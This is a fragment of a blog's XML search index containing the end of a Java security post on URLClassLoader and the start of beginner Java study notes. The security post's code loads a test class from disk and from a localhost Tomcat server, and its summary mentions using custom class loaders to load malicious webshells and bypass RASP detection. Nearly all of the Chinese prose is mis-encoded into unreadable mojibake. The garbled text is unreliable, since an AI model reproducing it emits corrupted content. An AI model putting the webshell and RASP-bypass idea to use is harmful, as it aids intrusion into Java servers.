function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">File</span> file <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"d:/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URI</span> uri <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">toURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> uri<span class="token punctuation">.</span><span class="token function">toURL</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URLClassLoader</span> classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.test.Test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ËøôÈáå‰ΩøÁî®FileËé∑ÂèñÁ±ªÊñá‰ª∂Ë∑ØÂæÑÔºå‰πãÂêé‰ΩøÁî®URLClassLoaderËé∑ÂèñurlÂú∞ÂùÄ‰∏∫DÁõòÔºå‰πãÂêé‰ΩøÁî®loadClassÊñπÊ≥ïËé∑ÂèñTest.classÊâÄÂê´ÂåÖÂêçÔºåÁÑ∂ÂêéÂÆû‰æãÂåñ„ÄÇËøêË°åÂèëÁé∞Ëß£ÊûêËé∑ÂèñÂà∞‰∫ÜDÁõò‰∏≠Test.classÊñá‰ª∂„ÄÇ</p><p><img src="13.png" loading="lazy"></p><h3 id="2-ÁΩëÁªú‰º†ËæìclassÊñá‰ª∂Ë∞ÉÁî®"><a href="#2-ÁΩëÁªú‰º†ËæìclassÊñá‰ª∂Ë∞ÉÁî®" class="headerlink" title="2. ÁΩëÁªú‰º†ËæìclassÊñá‰ª∂Ë∞ÉÁî®"></a>2. ÁΩëÁªú‰º†ËæìclassÊñá‰ª∂Ë∞ÉÁî®</h3><p>‰πãÂêéÊàë‰ª¨Â∞ÜTest.classÊîæÁΩÆÂà∞ÁîµËÑëÁöÑTomcatÊúçÂä°Âô®ÁõÆÂΩï‰∏ãÔºåÁÑ∂ÂêéÂêØÂä®Tomcat„ÄÇ‰πãÂêéÊñ∞Âª∫‰∏™ClassLoaderDemoÁ±ªÁΩëÁªúÂä†ËΩΩTomcatÊúçÂä°Âô®‰∏≠ÁöÑTest.class.</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">Classloader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span><span class="token string">"http://localhost:8080/examples/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">URLClassLoader</span> classLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLClassLoader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>url<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> classLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.test.Test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        clazz<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ËøôÈáå‰ΩøÁî®URLClassLoaderÂä†ËΩΩÁΩëÁªú‰∏≠ÁöÑTomcatÊúçÂä°Âô®ÁõÆÂΩïÔºåÊàêÂäüËß£ÊûêËé∑ÂèñÂà∞‰∫ÜÁõÆÂΩï‰∏ãÁöÑTest.classÊñá‰ª∂„ÄÇ</p><p><img src="14.png" loading="lazy"></p><h2 id="Â∞èÁªì"><a href="#Â∞èÁªì" class="headerlink" title="Â∞èÁªì"></a>Â∞èÁªì</h2><p>ÈÄöËøáClassLoaderÁ±ªÁöÑÂ≠¶‰π†ÔºåÊàë‰ª¨Áü•ÈÅì‰∏ç‰ªÖ‰ªÖÂ±ÄÈôê‰∫éÂú®ClassPath‰∏≠Á±ªÁöÑË∞ÉÁî®ÔºåËøòËÉΩÂ§üÈÄöËøáËá™ÂÆö‰πâCLassLoaderÁ±ªÊù•Âä†ËΩΩÊàë‰ª¨ÁâπÂÆöÁöÑÁ±ªÊù•Êìç‰ΩúÂà©Áî®„ÄÇÂú®ÂÆâÂÖ®È¢ÜÂüüÂΩì‰∏≠ÔºåÊàë‰ª¨ÂæÄÂæÄ‰ºö‰ΩøÁî®ÂÖ∂ClassLoaderÁâπÊÄßÔºåËá™ÂÆö‰πâÊÅ∂ÊÑèÁöÑÁ±ªÂä†ËΩΩwebshellÂà©Áî®‰ª•ÂèäËá™ÂÆö‰ª•Á±ªÂ≠óËäÇÁ†ÅÁöÑnativeÊñπÊ≥ïÁªïËøáRASPÊ£ÄÊµã„ÄÇÊâÄ‰ª•‰∫ÜËß£ClassLoaderÁâπÊÄßÂπ∂ËøõË°åËá™ÂÆö‰πâÁºñÂÜôÔºåÂØπÊàë‰ª¨‰∫ÜËß£javaÂÆâÂÖ®Êú∫Âà∂ÂçÅÂàÜÈáçË¶Å„ÄÇ</p><p>ËΩ¨ËΩΩÂ§ß‰Ω¨ÊñáÁ´†</p><p><a href="https://xz.aliyun.com/t/9002?accounttraceid=1182a6e93e8242f58d4e872678042864ieed#toc-3">JAVAÂÆâÂÖ®Âü∫Á°ÄÔºà‰∏ÄÔºâ‚ÄìÁ±ªÂä†ËΩΩÂô®ÔºàClassLoaderÔºâ - ÂÖàÁü•Á§æÂå∫ (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> ÂÆâÂÖ®Áõ∏ÂÖ≥ </category>
          
          <category> JavaÂÆâÂÖ® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂü∫Á°ÄÂ≠¶‰π†Á¨îËÆ∞</title>
      <link href="/2024/08/31/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/08/31/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h3><p><strong>Á∫∏‰∏äÂæóÊù•ÁªàËßâÊµÖ,ÁªùÁü•Ê≠§‰∫ãË¶ÅË∫¨Ë°å„ÄÇ</strong></p><p><a href="https://aigz8jy30yo.feishu.cn/docx/EkhJdSJZPo5L22xSujzcdqvVnjf">JavaÂÖ•Èó®ÊïôÁ®ã-‰∏ä</a></p><p><a href="https://aigz8jy30yo.feishu.cn/docx/HKzhdYw84oXiY6x9hVhcEMT8nXg">JavaÂÖ•Èó®ÊïôÁ®ã-‰∏ã</a></p><p><a href="https://aigz8jy30yo.feishu.cn/docx/BtbOd3c5aotnpdxYTVDcnqQanxd">Java WebÂºÄÂèëÊïôÁ®ã</a></p><p>(ÊÑüË∞¢Â•ΩÊúãÂèãÁöÑÂàÜ‰∫´)</p><p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89.md">CTF-JavaÂü∫Á°Ä</a></p><p><a href="https://www.cainiaojc.com/java/java-reflection.html">Java ÂèçÂ∞Ñ(Reflection)</a></p><h3 id="JavaÁ®ãÂ∫èËÆæËÆ°ÁéØÂ¢É"><a href="#JavaÁ®ãÂ∫èËÆæËÆ°ÁéØÂ¢É" class="headerlink" title="JavaÁ®ãÂ∫èËÆæËÆ°ÁéØÂ¢É"></a>JavaÁ®ãÂ∫èËÆæËÆ°ÁéØÂ¢É</h3><ul><li>JDKÔºöÁºñÂÜôJavaÁ®ãÂ∫èÁöÑÁ®ãÂ∫èÂëò‰ΩøÁî®ÁöÑËΩØ‰ª∂„ÄÇ</li><li>SEÔºöÁî®‰∫éÊ°åÈù¢ÊàñÁÆÄÂçïÊúçÂä°Âô®Â∫îÁî®ÁöÑJavaÂπ≥Âè∞„ÄÇ</li><li>OpenJDKÔºöJava SEÁöÑ‰∏Ä‰∏™ÂÖçË¥πÂºÄÊ∫êÂÆûÁé∞„ÄÇ</li></ul><p>JDKÂÆâË£ÖÁõÆÂΩï‰ªãÁªç</p><table><thead><tr><th><strong>ÁõÆÂΩïÂêçÁß∞</strong></th><th><strong>ËØ¥Êòé</strong></th></tr></thead><tbody><tr><td>bin</td><td>ËØ•Ë∑ØÂæÑ‰∏ãÂ≠òÊîæ‰∫ÜJDKÁöÑÂêÑÁßçÂ∑•ÂÖ∑ÂëΩ‰ª§„ÄÇjavacÂíåjavaÂ∞±ÊîæÂú®Ëøô‰∏™ÁõÆÂΩï„ÄÇ</td></tr><tr><td>conf</td><td>ËØ•Ë∑ØÂæÑ‰∏ãÂ≠òÊîæ‰∫ÜJDKÁöÑÁõ∏ÂÖ≥ÈÖçÁΩÆÊñá‰ª∂„ÄÇ</td></tr><tr><td>include</td><td>ËØ•Ë∑ØÂæÑ‰∏ãÂ≠òÊîæ‰∫Ü‰∏Ä‰∫õÂπ≥Âè∞ÁâπÂÆöÁöÑÂ§¥Êñá‰ª∂„ÄÇ</td></tr><tr><td>jmods</td><td>ËØ•Ë∑ØÂæÑ‰∏ãÂ≠òÊîæ‰∫ÜJDKÁöÑÂêÑÁßçÊ®°Âùó„ÄÇ</td></tr><tr><td>legal</td><td>ËØ•Ë∑ØÂæÑ‰∏ãÂ≠òÊîæ‰∫ÜJDKÂêÑÊ®°ÂùóÁöÑÊéàÊùÉÊñáÊ°£„ÄÇ</td></tr><tr><td>lib</td><td>ËØ•Ë∑ØÂæÑ‰∏ãÂ≠òÊîæ‰∫ÜJDKÂ∑•ÂÖ∑ÁöÑ‰∏Ä‰∫õË°•ÂÖÖJARÂåÖ„ÄÇ</td></tr></tbody></table><p>JVMÔºàJava Virtual MachineÔºâÔºåJavaËôöÊãüÊú∫</p><p>JREÔºàJava Runtime EnvironmentÔºâÔºåJavaËøêË°åÁéØÂ¢ÉÔºåÂåÖÂê´‰∫ÜJVMÂíåJavaÁöÑÊ†∏ÂøÉÁ±ªÂ∫ìÔºàJava APIÔºâ</p><p>JDKÔºàJava Development KitÔºâÁß∞‰∏∫JavaÂºÄÂèëÂ∑•ÂÖ∑ÔºåÂåÖÂê´‰∫ÜJREÂíåÂºÄÂèëÂ∑•ÂÖ∑</p><h3 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HelloWorld</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"HelloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Áî®Âà∞‰∏§‰∏™ÂëΩ‰ª§Ôºö</p><pre class="language-java" data-language="java"><code class="language-java">javac <span class="token operator">+</span> Êñá‰ª∂Âêç <span class="token operator">+</span> ÂêéÁºÄÂêç ÔºàÂ∞±ÊòØÁºñËØëjavaÊñá‰ª∂Ôºâjava <span class="token operator">+</span> Êñá‰ª∂ÂêçÔºàËøêË°åÁºñËØë‰πãÂêéÁöÑ<span class="token keyword">class</span>Êñá‰ª∂Ôºâ</code></pre><h4 id="‰∏Ä‰∫õÊ≥®ÊÑèÁÇπ"><a href="#‰∏Ä‰∫õÊ≥®ÊÑèÁÇπ" class="headerlink" title="‰∏Ä‰∫õÊ≥®ÊÑèÁÇπ"></a>‰∏Ä‰∫õÊ≥®ÊÑèÁÇπ</h4><ul><li><p>Java‰ª£Á†Å‰∏≠ÔºåÊòØ‰∏•Ê†ºÂå∫ÂàÜÂ§ßÂ∞èÂÜôÁöÑÔºàÊØîÂ¶ÇSystemÔºâ</p></li><li><p>Á±ªÊòØÊûÑÂª∫ÊâÄÊúâJavaÂ∫îÁî®Á®ãÂ∫èÂíåapplletÁöÑÊûÑÂª∫ÂùóÔºåJavaÂ∫îÁî®Á®ãÂ∫è‰∏≠ÁöÑÂÖ®ÈÉ®ÂÜÖÂÆπÈÉΩÂøÖÈ°ªÊîæÁΩÆÂú®Á±ª‰∏≠„ÄÇ</p></li><li><p>Á±ªÂêçÂøÖÈ°ª‰ª•Â≠óÊØçÂºÄÂ§¥„ÄÇ‰∏îÂëΩÂêçËßÑËåÉÊòØÈ™ÜÈ©ºÂëΩÂêçÊ≥ï„ÄÇ</p></li><li><blockquote><p><strong>È©ºÂ≥∞ÂëΩ‰ª§Ê≥ï(Camel)</strong></p><p>‰πüÁß∞È™ÜÈ©ºÂºèÂëΩÂêçÊ≥ïÊ≠£Â¶ÇÂÆÉÁöÑÂêçÁß∞ÊâÄË°®Á§∫ÁöÑÈÇ£Ê†∑ÔºåÊòØÊåáÊ∑∑Âêà‰ΩøÁî®Â§ßÂ∞èÂÜôÂ≠óÊØçÊù•ÊûÑÊàêÂèòÈáèÂíåÂáΩÊï∞ÁöÑÂêçÂ≠ó‰æãÂ¶ÇÔºå‰∏ãÈù¢ÊòØÂàÜÂà´Áî®È™ÜÈ©ºÂºèÂëΩÂêçÊ≥ïÂíå‰∏ãÂàíÁ∫øÊ≥ïÂëΩÂêçÁöÑÂêå‰∏Ä‰∏™ÂáΩÊï∞Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token function">printEmployeePaychecks</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Ôºõ<span class="token function">print_employee_paychecks</span><span class="token punctuation">(</span><span class="token punctuation">)</span>Ôºõ</code></pre><p>Á¨¨‰∏Ä‰∏™ÂáΩÊï∞Âêç‰ΩøÁî®‰∫ÜÈ™ÜÈ©ºÂºèÂëΩÂêçÊ≥ïÔºåÂáΩÊï∞Âêç‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÈÄªËæëÊñ≠ÁÇπÈÉΩÊúâ‰∏Ä‰∏™Â§ßÂÜôÂ≠óÊØçÊù•Ê†áËÆ∞ÔºõÁ¨¨‰∫å‰∏™ÂáΩÊï∞Âêç‰ΩøÁî®‰∫Ü‰∏ãÂàíÁ∫øÊ≥ïÔºåÂáΩÊï∞Âêç‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÈÄªËæëÊñ≠ÁÇπÈÉΩÊúâ‰∏Ä‰∏™‰∏ãÂàíÁ∫øÊù•Ê†áËÆ∞</p></blockquote></li><li><p>Ê∫ê‰ª£Á†ÅÁöÑÊñá‰ª∂ÂêçÂøÖÈ°ª‰∏éÂÖ¨ÂÖ±Á±ªÁöÑÂêçÂ≠óÁõ∏ÂêåÔºåÂπ∂Áî®.java‰Ωú‰∏∫ÊãìÂ±ïÂêç„ÄÇ</p></li><li><p>ËøêË°åÂ∑≤ÁºñËØëÁöÑÁ®ãÂ∫èÊó∂ÔºåJavaËôöÊãüÊú∫ÊÄªÊòØ‰ªéÊåáÂÆöÁ±ªÁöÑmainÊñπÊ≥ïÂºÄÂßãÊâßË°å„ÄÇ‰∏îmainÊñπÊ≥ïÂøÖÈ°ªÂ£∞Êòé‰∏∫publicÔºå‰∏îÂøÖÈ°ªÊòØÈùôÊÄÅÁöÑ(static)„ÄÇ</p></li></ul><h3 id="JavaÂü∫Á°ÄËØ≠Ê≥ï"><a href="#JavaÂü∫Á°ÄËØ≠Ê≥ï" class="headerlink" title="JavaÂü∫Á°ÄËØ≠Ê≥ï"></a>JavaÂü∫Á°ÄËØ≠Ê≥ï</h3><h4 id="Ê≥®Èáä"><a href="#Ê≥®Èáä" class="headerlink" title="Ê≥®Èáä"></a>Ê≥®Èáä</h4><p>Java‰∏≠ÁöÑÊ≥®ÈáäÂàÜ‰∏∫‰∏âÁßçÔºö</p><ul><li>ÂçïË°åÊ≥®ÈáäÔºö</li></ul><pre class="language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F; ËøôÊòØÂçïË°åÊ≥®ÈáäÊñáÂ≠ó</code></pre><ul><li>Â§öË°åÊ≥®ÈáäÔºö</li></ul><pre class="language-Java" data-language="Java"><code class="language-Java">&#x2F;*ËøôÊòØÂ§öË°åÊ≥®ÈáäÊñáÂ≠óËøôÊòØÂ§öË°åÊ≥®ÈáäÊñáÂ≠óËøôÊòØÂ§öË°åÊ≥®ÈáäÊñáÂ≠ó*&#x2F;</code></pre><p>Ê≥®ÊÑèÔºöÂ§öË°åÊ≥®Èáä‰∏çËÉΩÂµåÂ•ó‰ΩøÁî®„ÄÇ</p><ul><li>ÊñáÊ°£Ê≥®ÈáäÔºàÊöÇÊó∂Áî®‰∏çÂà∞ÔºâÔºö</li></ul><pre class="language-Java" data-language="Java"><code class="language-Java">&#x2F;**ËøôÊòØÂ§öË°åÊ≥®ÈáäÊñáÂ≠óËøôÊòØÂ§öË°åÊ≥®ÈáäÊñáÂ≠óËøôÊòØÂ§öË°åÊ≥®ÈáäÊñáÂ≠ó*&#x2F;</code></pre><p><strong>‰ΩøÁî®ÁöÑÊäÄÂ∑ß</strong></p><ol><li>Â¶ÇÊûúÊàë‰ª¨Ë¶ÅÂØπ‰ª£Á†ÅËøõË°åËß£ÈáäÔºåÈÇ£‰πàÂ∞±ÂèØ‰ª•‰ΩøÁî®Ê≥®Èáä„ÄÇ</li><li>ÂΩìÊ≥®ÈáäÁöÑÂÜÖÂÆπÊØîËæÉÂ∞ëÔºå‰∏ÄË°åÂ∞±ÂÜôÂÆå‰∫ÜÔºåÂèØ‰ª•Áî®ÂçïË°åÊ≥®Èáä„ÄÇ</li><li>Â¶ÇÊûúÊ≥®ÈáäÁöÑÂÜÖÂÆπÊØîËæÉÂ§öÔºåÈúÄË¶ÅÂÜôÂú®Â§öË°åÔºåÈÇ£‰πàÂèØ‰ª•‰ΩøÁî®Â§öË°åÊ≥®Èáä„ÄÇ</li></ol><p><strong>Ê≥®ÊÑèÔºö</strong>Ê≥®ÈáäÁöÑÂÜÖÂÆπ‰∏ç‰ºöÂèÇ‰∏éÁºñËØëÂíåËøêË°åÁöÑÔºå‰ªÖ‰ªÖÊòØÂØπ‰ª£Á†ÅÁöÑËß£ÈáäËØ¥ÊòéËÄåÂ∑≤„ÄÇÊâÄ‰ª•Ôºå‰∏çÁÆ°Âú®Ê≥®ÈáäÂΩì‰∏≠ÂÜô‰ªÄ‰πàÂÜÖÂÆπÔºåÈÉΩ‰∏ç‰ºöÂΩ±Âìç‰ª£Á†ÅËøêË°åÁöÑÁªìÊûú„ÄÇ</p><h4 id="ÂèòÈáè"><a href="#ÂèòÈáè" class="headerlink" title="ÂèòÈáè"></a>ÂèòÈáè</h4><p>JavaÊòØÂº∫Á±ªÂûãËØ≠Ë®ÄÔºåÂøÖÈ°ª‰∏∫ÂèòÈáèÂ£∞ÊòéÁ±ªÂûã„ÄÇJava‰∏≠‰∏ÄÂÖ±ÂÖ´ÁßçÂü∫Êú¨Á±ªÂûãÔºå4ÁßçÊï¥ÂΩ¢Ôºå2ÁßçÊµÆÁÇπÁ±ªÂûãÔºå1ÁßçÂ≠óÁ¨¶‰∏≤Á±ªÂûãcharÂíåbooleanÁ±ªÂûã„ÄÇ</p><p><strong>Êï¥ÂΩ¢</strong>Ôºöint,short,long,byte„ÄÇ</p><p>Java‰∏≠Êï¥ÂΩ¢ÁöÑËåÉÂõ¥‰∏éËøêË°åJava‰ª£Á†ÅÁöÑÊú∫Âô®Êó†ÂÖ≥„ÄÇ</p><ul><li>longÔºö<code>400000L</code></li><li>ÂçÅÂÖ≠ËøõÂà∂Ôºö<code>0xCA</code></li><li>ÂÖ´ËøõÂà∂Ôºö<code>010</code></li><li>‰∫åËøõÂà∂Ôºö<code>0b1001</code></li></ul><p>JavaÊ≤°Êúâ‰ªª‰ΩïÊó†Á¨¶Âè∑ÂΩ¢ÂºèÁöÑÊï¥ÂΩ¢Á±ªÂûã„ÄÇ</p><p><strong>ÊµÆÁÇπ</strong>Ôºöfloat double</p><p>Ê≤°ÊúâÂêéÁºÄFÁöÑÊµÆÁÇπÊï∞ÂÄºÊÄªÊòØÈªòËÆ§‰∏∫doubleÁ±ªÂûã„ÄÇÂΩìÁÑ∂‰πüÂèØ‰ª•Âú®ÊúÄÂêéÊ∑ªÂä†ÂêéÁºÄDÊàñd„ÄÇ</p><p>ÊµÆÁÇπÊï∞ÂÄº‰∏çÈÄÇÂêà‰∫éÊó†Ê≥ïÊé•ÂèóËàçÂÖ•ËØØÂ∑ÆÁöÑÈáëËûçËÆ°ÁÆó„ÄÇÂ¶ÇÊûúÂú®Êï∞ÂÄºËÆ°ÁÆó‰∏≠‰∏çÂÖÅËÆ∏Êúâ‰ªª‰ΩïËàçÂÖ•ËØØÂ∑ÆÔºåÂ∞±Â∫îËØ•‰ΩøÁî®BigDecimalÁ±ª„ÄÇ</p><p><strong>charÁ±ªÂûã</strong></p><p>charÁ±ªÂûãÂéüÊú¨Áî®‰∫éË°®Á§∫Âçï‰∏™Â≠óÁ¨¶Ôºå‰∏çËøáÁé∞Âú®Â¶Ç‰ªäÊúâ‰∫õUnicodeÂ≠óÁ¨¶ÂèØ‰ª•Áî®‰∏Ä‰∏™charÂÄºÊèèËø∞ÔºåÂè¶Â§ñ‰∏Ä‰∫õunicodeÂ≠óÁ¨¶ÂàôÈúÄË¶Å2‰∏™charÂÄº„ÄÇ</p><p>charÁ±ªÂûãÁöÑÂ≠óÈù¢ÈáèË¶ÅÁî®ÂçïÂºïÂè∑Êã¨Ëµ∑Êù•Ôºå‰æãÂ¶Ç‚ÄôA‚ÄôÊòØÁºñÁ†ÅÂÄº‰∏∫65ÁöÑÂ≠óÁ¨¶Â∏∏Èáè„ÄÇ</p><p>charÁ±ªÂûãÁöÑÂÄºÂèØ‰ª•Ë°®Á§∫‰∏∫ÂçÅÂÖ≠ËøõÂà∂Ôºå‰ªé\u0000Âà∞\uffff„ÄÇ</p><p>ËΩ¨‰πâÂ∫èÂàó\uËøòÂèØ‰ª•Âá∫Áé∞Âú®Âä†ÂºïÂè∑ÁöÑÂ≠óÁ¨¶Â∏∏ÈáèÊàñÂ≠óÁ¨¶‰∏≤‰πãÂ§ñÔºåËÄåÂÖ∂‰ªñÁöÑÊâÄÊúâËΩ¨‰πâÂ∫èÂàóÈÉΩ‰∏çË°åÔºå‰æãÂ¶ÇÔºö</p><pre class="language-none"><code class="language-none">public static void main(String\u005B\u005D args)&#96;ÔºåÊòØ&#96;[]</code></pre><p>UnicodeËΩ¨‰πâÂ∫èÂàó‰ºöÂú®Ëß£Êûê‰ª£Á†Å‰πãÂâçÂæóÂà∞Â§ÑÁêÜÔºå‰æãÂ¶ÇÔºö</p><pre class="language-none"><code class="language-none">&quot;\u0022+\u0022&quot;&#96;ÊòØ&#96;&quot;&quot;+&quot;&quot;</code></pre><p>Âº∫ÁÉàÂª∫ËÆÆ‰∏çË¶ÅÂú®Á®ãÂ∫è‰∏≠‰ΩøÁî®charÁ±ªÂûãÔºåÊúÄÂ•ΩÂ∞ÜÂ≠óÁ¨¶‰∏≤‰Ωú‰∏∫ÊäΩË±°Êï∞ÊçÆÁ±ªÂûã‰ΩøÁî®„ÄÇ</p><p><strong>boolean</strong>Á±ªÂûã</p><p>falseÂíåtrue„ÄÇ<strong>Êï¥ÂûãÂÄºÂíåÂ∏ÉÂ∞îÂÄº‰πãÈó¥‰∏çËÉΩËøõË°åÁõ∏‰∫íËΩ¨Êç¢</strong></p><p><strong>ÂèòÈáè‰∏éÂ∏∏Èáè</strong></p><p>Java‰∏≠ÁöÑÊï∞Â≠óÂíåÂ≠óÊØçËåÉÂõ¥Êõ¥Â§ß„ÄÇ</p><p>Â£∞Êòé‰∏Ä‰∏™ÂèòÈáè‰πãÂêéÔºåÂøÖÈ°ªÁî®ËµãÂÄºËØ≠Âè•ÂØπÂèòÈáèËøõË°å<strong>ÊòæÂºè</strong>ÂàùÂßãÂåñÔºåÂçÉ‰∏á‰∏çË¶Å‰ΩøÁî®Êú™ÂàùÂßãÂåñÁöÑÂèòÈáèÁöÑÂÄº„ÄÇ</p><p>Java‰∏≠ÂèØ‰ª•Â∞ÜÂ£∞ÊòéÊîæÂú®‰ª£Á†Å‰∏≠ÁöÑ‰ªª‰ΩïÂú∞Êñπ„ÄÇ‰ΩÜÊòØÂèòÈáèÁöÑÂ£∞ÊòéÂ∞ΩÂèØËÉΩÂú∞Èù†ËøëÂèòÈáèÁ¨¨‰∏ÄÊ¨°‰ΩøÁî®ÁöÑÂú∞ÊñπÔºåËøôÊòØ‰∏ÄÁßçËâØÂ•ΩÁöÑÁ®ãÂ∫èÁºñÂÜôÈ£éÊ†º„ÄÇ</p><p><strong>‰ªéJava10ÂºÄÂßãÔºåÂØπ‰∫éÂ±ÄÈÉ®ÂèòÈáèÔºåÂ¶ÇÊûúÂèØ‰ª•‰ªéÂèòÈáèÁöÑÂàùÂßãÂÄºÊé®Êñ≠Âá∫ÂÆÉÁöÑÁ±ªÂûãÔºåÂ∞±‰∏çÂÜçÈúÄË¶ÅÂ£∞ÊòéÁ±ªÂûãÔºåÂè™ÈúÄË¶Å‰ΩøÁî®ÂÖ≥ÈîÆÂ≠óvarËÄåÊó†ÈúÄÊåáÂÆöÁ±ªÂûã</strong></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> feng <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span><span class="token keyword">var</span> fff <span class="token operator">=</span> <span class="token string">"feng"</span><span class="token punctuation">;</span></code></pre><p>Áî®finalÊåáÁ§∫Â∏∏Èáè„ÄÇfinalË°®Á§∫Ëøô‰∏™Â∏∏ÈáèÂè™ËÉΩË¢´ËµãÂÄº‰∏ÄÊ¨°„ÄÇÂ∏∏ÈáèÂêç‰ΩøÁî®ÂÖ®Â§ßÂÜô„ÄÇ</p><p>Â¶ÇÊûú‰∏Ä‰∏™Â∏∏ÈáèÂú®Á±ªÁöÑÂ§ö‰∏™ÊñπÊ≥ï‰∏≠Ë¢´‰ΩøÁî®ÔºåÈÄöÂ∏∏Â∞ÜÂÖ∂ËÆæÁΩÆÊàêÁ±ªÂ∏∏ÈáèÔºåÁî®<code>static final</code>„ÄÇ‰∏îÁ±ªÂ∏∏ÈáèÁöÑÂÆö‰πâÊîæÂú®mainÊñπÊ≥ïÁöÑÂ§ñÈÉ®</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span><span class="token punctuation">&#123;</span>    <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">double</span> <span class="token constant">PI</span> <span class="token operator">=</span> <span class="token number">3.14</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token constant">PI</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token 